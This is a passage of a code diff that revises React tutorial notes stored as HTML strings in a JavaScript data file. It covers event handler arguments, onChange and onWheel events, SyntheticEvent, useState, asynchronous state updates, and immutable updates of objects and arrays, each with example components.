+              <li><strong>The Solution — Anonymous Arrow Function Wrapper:</strong>
+                <ul class="notes-sub-list">
+                  <li>Wrap the function call inside an anonymous arrow function:
+                    <br><code>onClick={() =&gt; deleteItem(id)}</code>
+                  </li>
+                  <li>Here, the outer arrow function <code>() =&gt; ...</code> is a function <strong>reference</strong>. It is not called during render. When the user clicks the button, React invokes the arrow function, which in turn calls <code>deleteItem(id)</code> with the desired argument!</li>
+                </ul>
               </li>
-              <li>Because <code>deleteUser(user.id)</code> sits inside the arrow function's body, JavaScript does not execute it during render. It executes strictly when the user clicks the button!</li>
+              <li><strong>Accessing the Event Object with Arguments:</strong>
+                <ul class="notes-sub-list">
+                  <li>If you need both the native SyntheticEvent and custom arguments, forward <code>e</code> through the arrow function:
+                    <br><code>onClick={(e) =&gt; handleEdit(e, user.id)}</code>
+                  </li>
+                </ul>
+              </li>
             </ul>
+
+            <pre class="notes-code-block"><code>import React from 'react';
+
+function UserList() {
+  const users = [
+    { id: 101, name: 'Sarthak' },
+    { id: 102, name: 'Aman' },
+    { id: 103, name: 'Harsh' }
+  ];
+
+  const handleDelete = (id, e) => {
+    e.stopPropagation(); // Stop event bubbling
+    console.log('Deleting user ID:', id);
+  };
+
+  return (
+    &lt;ul className="space-y-2"&gt;
+      {users.map(user => (
+        &lt;li key={user.id} className="flex justify-between items-center p-3 border rounded"&gt;
+          &lt;span&gt;{user.name}&lt;/span&gt;
+          {/* Arrow function wrapper passes id without immediate execution */}
+          &lt;button 
+            onClick={(e) => handleDelete(user.id, e)}
+            className="text-red-500 hover:text-red-700 text-sm font-semibold"
+          &gt;
+            Delete
+          &lt;/button&gt;
+        &lt;/li&gt;
+      ))}
+    &lt;/ul&gt;
+  );
+}
+
+export default UserList;</code></pre>
           `
         }
       ]
     },
 
     /* ═══════════════════════════════════════════════════════════════
-       TOPIC 23: WORKING WITH INPUT EVENTS (ONCHANGE) & SCROLL WHEEL (ONWHEEL)
+       TOPIC 23
        ═══════════════════════════════════════════════════════════════ */
     {
-      id: "react-23-input-change-wheel-events",
+      id: "react-23-input-and-scroll-events",
       number: "23",
       shortLabel: "Input & Wheel Events",
       title: "Working With Input Events (onChange) & Scroll Wheel Events (onWheel)",
-      summary: "Capturing user typing with onChange and SyntheticEvent e.target.value, detecting scroll direction and velocity with onWheel and deltaY.",
-      subtopicLabels: ["23.1 Reading Input with onChange", "23.2 Scroll Direction with onWheel", "23.3 Interactive Event Patterns"],
+      summary: "Extracting user keystrokes with e.target.value in onChange, tracking trackpad/mouse wheel gestures with onWheel and deltaY polarity, and event normalization across browsers.",
+      subtopicLabels: ["23.1 Input Events & e.target.value", "23.2 Scroll Wheel Events & deltaY", "23.3 Cross-Browser Normalization"],
       diagramCount: 2,
       sections: [
         {
           num: "23.1",
-          title: "Reading Live Input Values With onChange & elem.target.value",
+          title: "Working With Input Events (onChange) & e.target.value",
           content: `
-            <ul class="notes-bullet-list">
-              <li><strong>Listening to Keystrokes in Real Time:</strong>
-                <ul class="notes-sub-list">
-                  <li>Attach <code>onChange</code> to an <code>&lt;input&gt;</code> element to run a handler function on every single character typed or deleted:
-                    <pre class="notes-code-block"><code>function App() {
-  function inputChanging(val) {
-    console.log('User typed:', val);
-  }
+            <p>
+              When a user interacts with text boxes (<code>&lt;input&gt;</code>, <code>&lt;textarea&gt;</code>), React intercepts every keystroke via the <code>onChange</code> prop.
+            </p>
 
-  return (
-    &lt;input
-      type="text"
-      placeholder="Type something..."
-      onChange={(elem) => inputChanging(elem.target.value)}
-      className="border p-2 rounded bg-neutral-900 text-white"
-    /&gt;
-  );
-}</code></pre>
-                  </li>
-                  <li><strong>The Event Target Object:</strong> React passes a <code>SyntheticEvent</code> object into your callback. The <code>elem.target.value</code> property provides the exact real-time string inside the input field (e.g. typing <em>"sarthak"</em> logs <em>s</em>, <em>sa</em>, <em>sar</em>, <em>sart</em>, <em>sarth</em>, <em>sartha</em>, <em>sarthak</em>).</li>
+            <ul class="notes-bullet-list">
+              <li><strong>The Input Event Lifecycle:</strong>
+                <ul class="notes-sub-list">
+                  <li>In native HTML, <code>onchange</code> fires only when the input <strong>loses focus</strong> (blur). React deliberately normalizes this so that <code>onChange</code> fires <strong>on every single keystroke</strong> (identical to the native <code>oninput</code> event).</li>
+                  <li>Whenever the user types a character, React creates a SyntheticEvent and passes it to your handler.</li>
+                </ul>
+              </li>
+              <li><strong>Extracting the Live Value via <code>e.target.value</code>:</strong>
+                <ul class="notes-sub-list">
+                  <li><code>e</code>: The React <strong>SyntheticEvent</strong> object.</li>
+                  <li><code>e.target</code>: The underlying physical DOM node (the <code>&lt;input&gt;</code> element).</li>
+                  <li><code>e.target.value</code>: The exact string currently present inside the text field.</li>
                 </ul>
               </li>
             </ul>
+
+            <pre class="notes-code-block"><code>import React, { useState } from 'react';
+
+function SearchBar() {
+  const [query, setQuery] = useState('');
+
+  const handleInputChange = (e) => {
+    // e.target.value contains the live string typed by the user
+    console.log('User typed:', e.target.value);
+    setQuery(e.target.value);
+  };
+
+  return (
+    &lt;div className="p-4"&gt;
+      &lt;input 
+        type="text" 
+        placeholder="Search topics..."
+        value={query}
+        onChange={handleInputChange}
+        className="w-full px-4 py-2 border rounded shadow-sm focus:outline-none focus:ring-2 focus:ring-emerald-500"
+      /&gt;
+      &lt;p className="mt-2 text-sm text-gray-500"&gt;Live Query: {query}&lt;/p&gt;
+    &lt;/div&gt;
+  );
+}
+
+export default SearchBar;</code></pre>
 
             <figure class="diagram-frame">
               <div class="diagram-frame-header">
@@ -4800,26 +4911,56 @@ export default defineConfig({
         },
         {
           num: "23.2",
-          title: "Detecting Scroll Direction & Speed With onWheel & elem.deltaY",
+          title: "Capturing Scroll Wheel Events (onWheel) & deltaY",
           content: `
+            <p>
+              Beyond keyboard and click events, modern web applications often build bespoke scroll experiences (such as horizontal card carousels, zoomable canvases, or 3D interactive viewers) using the <code>onWheel</code> event.
+            </p>
+
             <ul class="notes-bullet-list">
-              <li><strong>Tracking Mouse Wheel Movements:</strong>
+              <li><strong>What is <code>onWheel</code>?</strong>
                 <ul class="notes-sub-list">
-                  <li>React provides the <strong><code>onWheel</code></strong> listener for containers to capture trackpad and mouse-wheel events:
-                    <pre class="notes-code-block"><code>&lt;div onWheel={(e) => pageScrolling(e.deltaY)} className="h-screen w-full"&gt;
-  Scroll over this canvas
-&lt;/div&gt;</code></pre>
-                  </li>
+                  <li><code>onWheel</code> fires continuously as the user rotates a mouse scroll wheel or swipes two fingers vertically on a laptop trackpad.</li>
+                  <li>Unlike <code>onScroll</code> (which only fires when a scrollable container's scrollbar moves), <code>onWheel</code> detects user intent even on unscrollable elements.</li>
                 </ul>
               </li>
-              <li><strong>Decoding <code>elem.deltaY</code> (Direction & Velocity):</strong>
+              <li><strong>Understanding <code>e.deltaY</code> Polarity:</strong>
                 <ul class="notes-sub-list">
-                  <li><strong>Positive (<code>deltaY &gt; 0</code>):</strong> User is scrolling <strong>downwards / forward</strong> (<em>seedha</em> scroll).</li>
-                  <li><strong>Negative (<code>deltaY &lt; 0</code>):</strong> User is scrolling <strong>upwards / backward</strong> (<em>ulta</em> scroll).</li>
-                  <li><strong>Magnitude (Speed):</strong> Gentle scrolling produces small numbers near <code>0</code>, while rapid gestures produce large values (e.g. <code>+100</code> or <code>-100</code>).</li>
+                  <li><code>e.deltaY &gt; 0</code>: User scrolled <strong>DOWN</strong> (pulling content upward).</li>
+                  <li><code>e.deltaY &lt; 0</code>: User scrolled <strong>UP</strong> (pushing content downward).</li>
+                  <li><strong>Converting Vertical Wheel to Horizontal Scroll:</strong> By attaching <code>onWheel</code> to a horizontally scrollable container, you can translate <code>e.deltaY</code> directly into container <code>scrollLeft += e.deltaY</code>, allowing users to scroll horizontal carousels smoothly with a standard mouse!</li>
                 </ul>
               </li>
             </ul>
+
+            <pre class="notes-code-block"><code>import React, { useRef } from 'react';
+
+function HorizontalCarousel({ items }) {
+  const containerRef = useRef(null);
+
+  const handleWheel = (e) => {
+    // Convert vertical wheel rotation into horizontal container scroll
+    if (containerRef.current) {
+      containerRef.current.scrollLeft += e.deltaY;
+    }
+  };
+
+  return (
+    &lt;div 
+      ref={containerRef}
+      onWheel={handleWheel}
+      className="flex gap-4 overflow-x-auto p-4 scroll-smooth"
+    &gt;
+      {items.map((item, idx) => (
+        &lt;div key={idx} className="min-w-[280px] h-40 bg-card rounded-lg p-4 shadow border"&gt;
+          &lt;h4 className="font-bold"&gt;{item.title}&lt;/h4&gt;
+        &lt;/div&gt;
+      ))}
+    &lt;/div&gt;
+  );
+}
+
+export default HorizontalCarousel;</code></pre>
 
             <figure class="diagram-frame">
               <div class="diagram-frame-header">
@@ -4860,17 +5001,20 @@ export default defineConfig({
         },
         {
           num: "23.3",
-          title: "Interactive Event Patterns Summary",
+          title: "SyntheticEvent Normalization Across Browsers",
           content: `
+            <p>
+              In raw JavaScript, different browsers historically exposed different properties on event objects (e.g., <code>wheelDelta</code> in older WebKit vs <code>detail</code> in Firefox).
+            </p>
+
             <ul class="notes-bullet-list">
-              <li><strong>The Three Core React Function Execution Patterns:</strong>
+              <li><strong>React's SyntheticEvent Wrapper:</strong>
                 <ul class="notes-sub-list">
-                  <li><strong>Pattern 1 · Direct Function Reference:</strong> <code>onClick={handleClick}</code> — best for zero-argument handlers.</li>
-                  <li><strong>Pattern 2 · Inline Wrapper Arrow Function:</strong> <code>onClick={() => deleteItem(item.id)}</code> — mandatory when passing custom arguments.</li>
-                  <li><strong>Pattern 3 · Event Data Pass-through:</strong> <code>onChange={(e) => updateSearch(e.target.value)}</code> — essential for extracting form inputs and telemetry.</li>
+                  <li>React wraps the browser's native event in a cross-browser instance called <strong>SyntheticEvent</strong>. It conforms to the W3C event specification, meaning code written for Chrome works with 100% identical property names on Firefox, Safari, Edge, and iOS.</li>
+                  <li><strong>Accessing Native Event:</strong> If you ever need access to the browser's underlying raw DOM event, it is accessible via <code>e.nativeEvent</code>.</li>
+                  <li><strong>Event Pooling Deprecation:</strong> In React 16 and earlier, SyntheticEvents were pooled and wiped after dispatch for performance. Since React 17+, event pooling was removed, so you can safely read <code>e.target.value</code> inside asynchronous functions (such as <code>setTimeout</code> or <code>fetch</code> callbacks) without calling <code>e.persist()</code>.</li>
                 </ul>
               </li>
-              <li><strong>Senior Engineering Foundation:</strong> Master these three core invocation patterns thoroughly before diving into React Hooks, as all interactive state updates in modern React build directly on top of them.</li>
             </ul>
           `
         }
@@ -4878,34 +5022,38 @@ export default defineConfig({
     },
 
     /* ═══════════════════════════════════════════════════════════════
-       TOPIC 24: WHAT IS STATE & INTRODUCTION TO THE USESTATE HOOK
+       TOPIC 24
        ═══════════════════════════════════════════════════════════════ */
     {
-      id: "react-24-what-is-state-usestate-intro",
+      id: "react-24-what-is-state-usestate",
       number: "24",
-      shortLabel: "State & useState Intro",
+      shortLabel: "What Is State & useState",
       title: "What Is State & Introduction to the useState Hook",
-      summary: "Understanding UI state transitions, why standard variables fail to trigger re-renders, useState hook fundamentals, and the counter app implementation.",
-      subtopicLabels: ["24.1 Understanding State", "24.2 Variables vs useState", "24.3 Counter App Implementation"],
+      summary: "Understanding state as dynamic component memory, why plain JS variables fail to re-render the UI, the useState hook anatomy, and the fundamental component re-render lifecycle.",
+      subtopicLabels: ["24.1 Understanding State & Real-World Mental Models", "24.2 Why Plain Variables Fail", "24.3 useState Syntax & Counter App Architecture"],
       diagramCount: 2,
       sections: [
         {
           num: "24.1",
-          title: "Understanding State With Real-World Examples",
+          title: "Understanding State & Real-World Mental Models",
           content: `
+            <p>
+              In front-end engineering, a website is not a static brochure—it is an interactive machine whose appearance and data shift constantly based on user actions, timers, and network responses.
+            </p>
+
             <ul class="notes-bullet-list">
-              <li><strong>What Is Component State?</strong>
+              <li><strong>What is "State"?</strong>
                 <ul class="notes-sub-list">
-                  <li><strong>State</strong> represents the live data or condition held by a component at any given point in time.</li>
-                  <li>Whenever that data mutates, React transitions the component from its previous state to a <strong>new visual state</strong> by automatically re-rendering the UI.</li>
+                  <li><strong>Definition:</strong> <strong>State</strong> is a component's internal memory. It is a snapshot of all the dynamic data that dictates what is rendered on the screen at any given moment in time.</li>
+                  <li>Whenever state changes, the component transitions from its current state to a brand-new state, triggering an automatic visual update.</li>
                 </ul>
               </li>
               <li><strong>Real-World Everyday Examples:</strong>
                 <ul class="notes-sub-list">
-                  <li><strong>Counter:</strong> A badge showing <code>1</code> is State A; user clicks increase and it shows <code>2</code> (State B).</li>
-                  <li><strong>User Profile:</strong> A username showing <code>"Sarthak"</code> updates to <code>"Harsh"</code> after an API fetch.</li>
-                  <li><strong>Input Field:</strong> An empty search box is State 1; typing the letter <code>"S"</code> transitions it to State 2.</li>
-                  <li><strong>Instagram Feed:</strong> A post's like count updating from <code>26</code> to <code>27</code>, or an unread DM badge jumping from <code>7</code> to <code>8</code>.</li>
+                  <li><strong>Instagram Feed:</strong> When you tap the heart icon, the like count increments from <code>142</code> to <code>143</code>, and the heart icon turns red. That change is a state transition.</li>
+                  <li><strong>Shopping Cart:</strong> Adding a pair of shoes increments the cart badge from <code>0</code> to <code>1</code> and computes a new subtotal.</li>
+                  <li><strong>Dark Mode Toggle:</strong> Switching the theme from light to dark toggles a boolean state flag from <code>false</code> to <code>true</code>.</li>
+                  <li><strong>Authentication:</strong> Logging in shifts the user state from <code>null</code> to <code>{ username: "Sarthak", token: "..." }</code>.</li>
                 </ul>
               </li>
             </ul>
@@ -4968,21 +5116,22 @@ export default defineConfig({
         },
         {
           num: "24.2",
-          title: "Why We Need useState Instead of Normal Variables",
+          title: "Why Plain JavaScript Variables Fail in React",
           content: `
+            <p>
+              Beginners often ask: <em>"Why can't I just declare <code>let count = 0</code> and do <code>count++</code> inside my button click handler?"</em>
+            </p>
+
             <ul class="notes-bullet-list">
-              <li><strong>The Failure of Standard JavaScript Variables:</strong>
+              <li><strong>The Two Fatal Flaws of Standard Variables:</strong>
                 <ul class="notes-sub-list">
-                  <li>If you create a normal variable (<code>let count = 0</code>) and increment it (<code>count++</code>), the value in JavaScript memory changes, but <strong>React has no mechanism to know about it</strong>.</li>
-                  <li>React never schedules a re-render, leaving the browser screen frozen showing the old value!</li>
+                  <li><strong>1. Local Variables Do Not Trigger Re-Renders:</strong> React has no built-in mechanism to listen for changes to regular JavaScript variables. Mutating <code>count = count + 1</code> changes the value in memory, but React is completely unaware of the mutation. The Virtual DOM is never updated, and the screen remains frozen at <code>0</code>!</li>
+                  <li><strong>2. Local Variables Reset on Every Render:</strong> Whenever a component re-renders (e.g. because its parent re-rendered or another state changed), the component function executes from top to bottom. Any plain variable declared inside (<code>let count = 0</code>) is re-initialized to <code>0</code>, completely wiping out your previous changes!</li>
                 </ul>
               </li>
-              <li><strong>The Role of <code>useState</code>:</strong>
+              <li><strong>The Solution — <code>useState</code>:</strong>
                 <ul class="notes-sub-list">
-                  <li><code>useState</code> bridges the gap between memory and screen. When you call the setter function (<code>setCount</code>), it alerts React's reconciliation engine to trigger a fresh render with the updated value.</li>
-                  <li><strong>Common Beginner Gotcha:</strong> Calling <code>useState()</code> without importing it from <code>'react'</code> triggers a fatal error: <code>ReferenceError: useState is not defined</code>. Always import:
-                    <pre class="notes-code-block"><code>import React, { useState } from 'react';</code></pre>
-                  </li>
+                  <li>The <code>useState</code> hook tells React: <em>"Reserve a persistent memory slot for this data in Fiber memory across renders, and provide me with a setter function that notifies React to re-render the UI whenever this data updates."</em></li>
                 </ul>
               </li>
             </ul>
@@ -5026,103 +5175,109 @@ export default defineConfig({
         },
         {
           num: "24.3",
-          title: "Counter App Implementation (Exact Code)",
+          title: "useState Syntax, Deconstruction & The Counter Pattern",
           content: `
+            <p>
+              To declare state in a functional component, we import and invoke the <code>useState</code> hook from <code>'react'</code>.
+            </p>
+
             <ul class="notes-bullet-list">
-              <li><strong>The Three Core Counter Actions:</strong>
+              <li><strong>Anatomy of the <code>useState</code> Call:</strong>
+                <pre class="notes-code-block"><code>const [stateValue, setStateFunction] = useState(initialValue);</code></pre>
                 <ul class="notes-sub-list">
-                  <li><strong>Increase:</strong> <code>setNum(num + 1)</code></li>
-                  <li><strong>Decrease:</strong> <code>setNum(num - 1)</code></li>
-                  <li><strong>Jump by 5:</strong> <code>setNum(num + 5)</code></li>
-                  <li><strong>Rule:</strong> Never write <code>num++</code> or <code>num = num + 1</code>. Always use the setter function <code>setNum(...)</code>.</li>
+                  <li><code>initialValue</code>: The starting value of the state (number, string, boolean, array, or object) used during the component's initial mount.</li>
+                  <li><code>stateValue</code>: The current value of the state for this specific render cycle.</li>
+                  <li><code>setStateFunction</code>: The dispatch function used to schedule an update and notify React to re-render.</li>
+                  <li><strong>Array Destructuring:</strong> <code>useState</code> returns an array with exactly two elements: <code>[value, setter]</code>. We use JavaScript array destructuring to assign custom, descriptive names (e.g. <code>[num, setNum]</code>, <code>[isOpen, setIsOpen]</code>).</li>
                 </ul>
+              </li>
+              <li><strong>Common Junior Mistake:</strong> Calling <code>useState</code> without importing it:
+                <br><code>Uncaught ReferenceError: useState is not defined</code>
+                <br>Always verify: <code>import React, { useState } from 'react';</code>
               </li>
             </ul>
 
-            <pre class="notes-code-block"><code>import React, { useState } from 'react'
+            <pre class="notes-code-block"><code>import React, { useState } from 'react';
 
-const App = () => {
-  const [num, setNum] = useState(0)
+function CounterApp() {
+  // Declare state variable 'num' initialized to 0
+  const [num, setNum] = useState(0);
 
-  function increaseNum() {
-    setNum(num + 1)
-  }
-
-  function decreaseNum() {
-    setNum(num - 1)
-  }
-
-  function jump5Num() {
-    setNum(num + 5)
-  }
+  const increment = () => setNum(num + 1);
+  const decrement = () => setNum(num - 1);
+  const jumpFive = () => setNum(num + 5);
+  const reset = () => setNum(0);
 
   return (
-    <div>
-      <h1>{num}</h1>
-      <button onClick={increaseNum}>increase</button>
-      <button onClick={decreaseNum}>decrease</button>
-      <button onClick={jump5Num}>Increase by 5</button>
-    </div>
-  )
+    &lt;div className="p-6 max-w-sm mx-auto bg-card rounded-xl shadow-md border text-center"&gt;
+      &lt;h2 className="text-sm font-semibold tracking-wide text-text-secondary uppercase"&gt;
+        Interactive Counter
+      &lt;/h2&gt;
+      &lt;div className="text-5xl font-mono font-bold my-4 text-emerald-600"&gt;
+        {num}
+      &lt;/div&gt;
+      
+      &lt;div className="flex gap-2 justify-center"&gt;
+        &lt;button onClick={decrement} className="px-3 py-1.5 bg-gray-200 dark:bg-gray-700 rounded font-bold"&gt;
+          -1
+        &lt;/button&gt;
+        &lt;button onClick={increment} className="px-3 py-1.5 bg-emerald-600 text-white rounded font-bold"&gt;
+          +1
+        &lt;/button&gt;
+        &lt;button onClick={jumpFive} className="px-3 py-1.5 bg-indigo-600 text-white rounded font-bold"&gt;
+          +5
+        &lt;/button&gt;
+        &lt;button onClick={reset} className="px-3 py-1.5 bg-red-100 text-red-600 rounded font-bold"&gt;
+          Reset
+        &lt;/button&gt;
+      &lt;/div&gt;
+    &lt;/div&gt;
+  );
 }
 
-export default App</code></pre>
+export default CounterApp;</code></pre>
           `
         }
       ]
     },
 
     /* ═══════════════════════════════════════════════════════════════
-       TOPIC 25: HOW USESTATE WORKS UNDER THE HOOD
+       TOPIC 25
        ═══════════════════════════════════════════════════════════════ */
     {
-      id: "react-25-usestate-async-arrays-objects",
+      id: "react-25-how-usestate-works-under-the-hood",
       number: "25",
-      shortLabel: "useState Async, Arrays & Objects",
+      shortLabel: "useState Under the Hood",
       title: "How useState Works Under the Hood (Async Updates, Arrays & Objects)",
-      summary: "Asynchronous state setter execution, immutability & the Cameraman Analogy, array updates with spread operator, and object updates with prev callback.",
-      subtopicLabels: ["25.1 Asynchronous State Setter", "25.2 Array Updates & Cameraman Analogy", "25.3 Object Updates with prev Callback"],
+      summary: "Why state updates are asynchronous and batched, the stale state console.log gotcha, the rule of immutable state updates, and updating complex objects and arrays using the spread operator.",
+      subtopicLabels: ["25.1 Asynchronous State & Stale Closures", "25.2 The Immutability Rule & Reference Equality", "25.3 Updating Objects & Arrays With Spread (...)", "25.4 Complete Multi-Type State Architecture"],
       diagramCount: 2,
       sections: [
         {
           num: "25.1",
-          title: "Asynchronous Behavior of the State Setter (setNum)",
+          title: "Asynchronous State Updates & The Stale console.log Gotcha",
           content: `
+            <p>
+              One of the biggest mental hurdles for engineers transitioning to React is realizing that <strong>calling a state setter does NOT immediately update the state variable</strong> in the current execution frame.
+            </p>
+
             <ul class="notes-bullet-list">
-              <li><strong>Synchronous vs. Asynchronous:</strong>
-                <ul class="notes-sub-list">
-                  <li><strong>Synchronous:</strong> Code executes strictly sequentially line-by-line, blocking execution until the statement completes.</li>
-                  <li><strong>Asynchronous:</strong> Tasks are scheduled in the background, allowing subsequent code to execute immediately without waiting.</li>
-                </ul>
+              <li><strong>The Stale Log Surprise:</strong>
+                <pre class="notes-code-block"><code>const [count, setCount] = useState(0);
+
+const handleClick = () => {
+  setCount(count + 1);
+  console.log(count); // Prints: 0, NOT 1!
+};</code></pre>
               </li>
-              <li><strong>The Stale Log Gotcha:</strong>
+              <li><strong>Why Does This Happen?</strong>
                 <ul class="notes-sub-list">
-                  <li>State setters in React run <strong>asynchronously</strong>. When you call <code>setNum(30)</code>, React schedules the update for the next render.</li>
-                  <li>If you inspect <code>console.log(num)</code> on the very next line, it <strong>STILL logs the old value (10)</strong> because the current render cycle has not completed!</li>
+                  <li><strong>State is a Snapshot:</strong> When a component renders, it captures a snapshot of state for that specific render pass. In the code above, <code>count</code> is a <code>const</code> variable equal to <code>0</code> inside that render frame.</li>
+                  <li><strong>Setter Schedules a Re-Render:</strong> <code>setCount(1)</code> does not mutate the local <code>count</code> constant. It enqueues an update with the React Fiber scheduler. React finishes the current function execution, performs reconciliation, and calls the component again in the <em>next</em> render pass, where <code>count</code> will be <code>1</code>.</li>
+                  <li><strong>How to inspect new state:</strong> Use <code>useEffect(() =&gt; { console.log(count); }, [count]);</code> to observe the value after the re-render has completed.</li>
                 </ul>
               </li>
             </ul>
-
-            <pre class="notes-code-block"><code>import React, { useState } from 'react'
-
-const App = () => {
-  const [num, setNum] = useState(10)
-
-  const btnClicked = () => {
-    console.log(num) // logs 10
-    setNum(30)
-    console.log(num) // STILL logs 10!
-  }
-
-  return (
-    <div>
-      <h1>{num}</h1>
-      <button onClick={btnClicked}>click</button>
-    </div>
-  )
-}
-
-export default App</code></pre>
 
             <figure class="diagram-frame">
               <div class="diagram-frame-header">
@@ -5179,78 +5334,33 @@ export default App</code></pre>
         },
         {
           num: "25.2",
-          title: "Updating Arrays in useState (Spread Operator & Cameraman Analogy)",
+          title: "The Immutability Rule & Reference Equality Checking",
           content: `
+            <p>
+              In JavaScript, primitive types (numbers, strings, booleans) are passed by value, but complex data structures (Arrays, Objects) are stored and compared by <strong>memory reference</strong>.
+            </p>
+
             <ul class="notes-bullet-list">
-              <li><strong>The Cameraman Analogy (Why Direct Mutation Fails):</strong>
+              <li><strong>How React Detects State Changes (<code>Object.is</code>):</strong>
                 <ul class="notes-sub-list">
-                  <li>Just as the instructor doesn't walk over to the studio camera to nudge it manually—they ask the cameraman to adjust it—in React, you <strong>never mutate state arrays directly</strong> (e.g. <code>num.push(99)</code>).</li>
-                  <li>In JavaScript, arrays are reference types. Mutating an array in-place keeps the <strong>exact same memory address</strong> (<code>oldRef === newRef</code>), so React's diffing engine assumes nothing changed and skips rendering!</li>
+                  <li>When you call a state setter, React performs a shallow equality check: <code>Object.is(previousState, nextState)</code>.</li>
+                  <li>If <code>previousState === nextState</code>, React concludes that <em>nothing changed</em> and immediately skips re-rendering the component (bailout optimization).</li>
                 </ul>
               </li>
-              <li><strong>The Immutable Pattern (Spread Operator <code>...</code>):</strong>
+              <li><strong>The Fatal Direct Mutation Trap:</strong>
+                <pre class="notes-code-block"><code>// ❌ NEVER DO THIS IN REACT:
+user.age = 25;           // Mutating existing object in-place
+setUser(user);           // Memory reference is IDENTICAL! React bails out!
+
+numbers.push(4);         // Mutating existing array in-place
+setNumbers(numbers);     // Memory reference is IDENTICAL! Screen will NOT update!</code></pre>
+              </li>
+              <li><strong>The Golden Rule: Always Provide a New Object/Array Reference:</strong>
                 <ul class="notes-sub-list">
-                  <li>Create a new copy with <code>[...num]</code>, push the item into the copy, and pass the copy to <code>setNum</code>:</li>
+                  <li>To update an array or object in React, you must copy the existing data into a brand-new object or array using the spread operator (<code>...</code>) or pure array methods (<code>.filter()</code>, <code>.map()</code>, <code>.concat()</code>).</li>
                 </ul>
               </li>
             </ul>
-
-            <pre class="notes-code-block"><code>import React, { useState } from 'react'
-
-const App = () => {
-  const [num, setNum] = useState([10, 20, 30])
-
-  const btnClicked = () => {
-    const newNum = [...num]
-    newNum.push(99)
-    setNum(newNum) // New memory reference triggers re-render!
-  }
-
-  return (
-    <div>
-      <h1>{num.join(', ')}</h1>
-      <button onClick={btnClicked}>click</button>
-    </div>
-  )
-}
-
-export default App</code></pre>
-          `
-        },
-        {
-          num: "25.3",
-          title: "Updating Objects in useState (prev Callback Shorthand)",
-          content: `
-            <ul class="notes-bullet-list">
-              <li><strong>Updating Nested Object Properties Safely:</strong>
-                <ul class="notes-sub-list">
-                  <li>Just like arrays, modifying an object property directly (<code>num.age = 50</code>) does not trigger a re-render.</li>
-                  <li>Use the <strong>functional state updater with spread operator</strong> to copy all existing fields and overwrite only the target key:
-                    <pre class="notes-code-block"><code>setNum(prev => ({ ...prev, age: 50 }))</code></pre>
-                  </li>
-                  <li>This cleanly preserves <code>user: 'Rishi'</code> while immutably setting <code>age: 50</code>.</li>
-                </ul>
-              </li>
-            </ul>
-
-            <pre class="notes-code-block"><code>import React, { useState } from 'react'
-
-const App = () => {
-  const [num, setNum] = useState({ user: 'Rishi', age: 17 })
-
-  const btnClicked = () => {
-    setNum(prev => ({ ...prev, age: 50 }))
-  }
-
-  return (
-    <div>
-      <h1>{num.user}, {num.age}</h1>
-      <button onClick={btnClicked}>click</button>
-    </div>
-  )
-}
-
-export default App</code></pre>
 
             <figure class="diagram-frame">
               <div class="diagram-frame-header">
@@ -5305,49 +5415,149 @@ export default App</code></pre>
               </div>
             </figure>
           `
+        },
+        {
+          num: "25.3",
+          title: "Updating Objects & Arrays With the Spread Operator (...)",
+          content: `
+            <p>
+              To maintain pure immutability without losing existing properties, developers use the JavaScript spread syntax:
+            </p>
+
+            <ul class="notes-bullet-list">
+              <li><strong>Updating an Object (Shallow Copy + Override):</strong>
+                <pre class="notes-code-block"><code>const [user, setUser] = useState({ name: 'Sarthak', age: 24, city: 'Bhopal' });
+
+// Update age while keeping name and city intact:
+const updateAge = () => {
+  setUser(prev => ({
+    ...prev,       // 1. Copy all existing properties into a new object
+    age: 25        // 2. Overwrite the specific property
+  }));
+};</code></pre>
+              </li>
+              <li><strong>Adding an Item to an Array:</strong>
+                <pre class="notes-code-block"><code>const [todos, setTodos] = useState(['Learn JSX', 'Learn Props']);
+
+// Append new item without mutating original array:
+const addTodo = (newTodo) => {
+  setTodos(prev => [...prev, newTodo]); // New array reference created
+};</code></pre>
+              </li>
+              <li><strong>Removing an Item from an Array (Pure Immutability):</strong>
+                <pre class="notes-code-block"><code>// Remove item at specific index using pure .filter():
+const removeTodo = (targetIndex) => {
+  setTodos(prev => prev.filter((_, idx) => idx !== targetIndex));
+};</code></pre>
+              </li>
+            </ul>
+          `
+        },
+        {
+          num: "25.4",
+          title: "Complete Multi-Type State Architecture (Production Pattern)",
+          content: `
+            <p>
+              Here is a production-grade component demonstrating how strings, numbers, booleans, objects, and arrays are managed simultaneously under pure immutability:
+            </p>
+
+            <pre class="notes-code-block"><code>import React, { useState } from 'react';
+
+function UserProfileCard() {
+  // 1. Primitive state
+  const [isEditing, setIsEditing] = useState(false);
+
+  // 2. Object state
+  const [profile, setProfile] = useState({
+    username: 'sarthak_dev',
+    email: 'sarthak@example.com',
+    stats: { rep: 420, tier: 'Pro' }
+  });
+
+  // 3. Array of objects state
+  const [skills, setSkills] = useState(['React', 'Tailwind', 'TypeScript']);
+
+  const addSkill = (newSkill) => {
+    if (!newSkill.trim() || skills.includes(newSkill)) return;
+    setSkills(prev => [...prev, newSkill]); // Immutable append
+  };
+
+  const removeSkill = (skillToRemove) => {
+    setSkills(prev => prev.filter(s => s !== skillToRemove)); // Immutable delete
+  };
+
+  const updateEmail = (newEmail) => {
+    setProfile(prev => ({
+      ...prev,
+      email: newEmail // Immutable object update
+    }));
+  };
+
+  return (
+    &lt;div className="p-6 max-w-md mx-auto bg-card rounded-xl border shadow-sm"&gt;
+      &lt;h3 className="text-xl font-bold text-text-primary"&gt;@{profile.username}&lt;/h3&gt;
+      &lt;p className="text-sm text-text-muted"&gt;{profile.email}&lt;/p&gt;
+      &lt;span className="inline-block mt-2 px-2 py-0.5 text-xs bg-emerald-100 text-emerald-800 rounded font-semibold"&gt;
+        {profile.stats.tier} Tier · {profile.stats.rep} Rep
+      &lt;/span&gt;
+
+      &lt;div className="mt-4"&gt;
+        &lt;h4 className="text-xs uppercase font-bold tracking-wider text-text-muted mb-2"&gt;Skills&lt;/h4&gt;
+        &lt;div className="flex flex-wrap gap-1.5"&gt;
+          {skills.map(skill =&gt; (
+            &lt;span key={skill} className="px-2 py-1 bg-surface border rounded text-xs flex items-center gap-1.5"&gt;
+              {skill}
+              &lt;button onClick={() =&gt; removeSkill(skill)} className="text-red-500 hover:text-red-700 font-bold"&gt;
+                &times;
+              &lt;/button&gt;
+            &lt;/span&gt;
+          ))}
+        &lt;/div&gt;
+      &lt;/div&gt;
+    &lt;/div&gt;
+  );
+}
+
+export default UserProfileCard;</code></pre>
+          `
         }
       ]
     },
 
     /* ═══════════════════════════════════════════════════════════════
-       TOPIC 26: BATCH UPDATES IN REACT (NUM + 1 VS. PREV => PREV + 1)
+       TOPIC 26
